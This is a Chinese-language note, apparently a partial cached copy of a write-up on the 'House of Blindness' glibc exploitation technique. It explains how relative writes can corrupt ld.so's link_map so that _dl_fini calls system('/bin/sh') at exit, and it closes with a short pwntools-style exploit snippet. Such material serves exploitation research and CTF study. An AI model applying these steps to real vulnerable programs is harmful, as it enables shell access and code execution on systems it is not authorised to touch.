---
来源: https://hackmd.io/@pepsipu/S15ivxPDt
类型: raw (partial — 搜索缓存摘录，原文 hackmd 从当前网络不可达；nightmare/daydream 博客全文可交叉验证同一套机制)
获取日期: 2026-09-12
---

# House of Blindness（部分捕获）

> 完整机制见同目录 nightmare（blog 镜像全文）——HoB 是其 _dl_fini 变体的独立阐述。

## 核心机制摘录

- 前提: 仅 relative write（mmap 相对写），无任何泄漏。
- malloc 超大尺寸 → mmap chunk；idx 可为负/越界 → 写到与 chunk 已知相对偏移的任意位置（mmap 页相邻或恒定间距）。
- _dl_fini 在 exit 时调用 .fini/.fini_array。析构地址 = l_addr + l->l_info[DT_FINI].d_un.d_ptr。
- l_info[DT_FINI] 是指向 .dynamic 中 Elf64_Dyn 的指针；LSB 覆写（低 12 位不受 ASLR 影响）可让它指向同 .dynamic 内的其他 Elf64_Dyn。
- .got.plt 与 .dynamic 相邻 → 2 字节覆写可让 l_info[DT_FINI] 读 GOT（引入 4 bit 爆破）。
- 更优: DT_DEBUG 条目的值是指向 ld.so 可写内存中 _r_debug 的指针 → 把 l_info[DT_FINI] 指到 DT_DEBUG，即可在可写内存伪造任意 d_ptr 值。
- l_addr 覆写为 (system - _r_debug) 的有符号差 → l_addr + d_ptr 解析到 system。
- 注意: 覆写 l_addr 会破坏后续调用 → 需同时把 l_info[DT_FINI_ARRAY] 置空。
- RDI 控制: 析构在 __rtld_lock_unlock_recursive(_dl_load_lock) 之后调用，rdi = ld.so 内指针 → 把 "/bin/sh" 写进 _dl_load_lock。
- 负偏移技巧: l_addr=0xffffffffffffffff 时解析到 _r_debug-1（仅第 9 字节溢出被丢弃）；偏移按有符号打包。

## 关键 exploit 片段

```python
write(ld.address + link_map + l_info + 8 * DT_FINI_ARRAY, p64(0))
write(ld.address + link_map + l_info + 8 * DT_FINI, b"\xb8")  # 指向 DT_DEBUG
write(ld.address + link_map, p64(libc.symbols["system"] - ld.symbols["_r_debug"], signed=True))
write(ld.symbols["_rtld_global"] + _dl_load_lock, b"/bin/sh\x00")
```
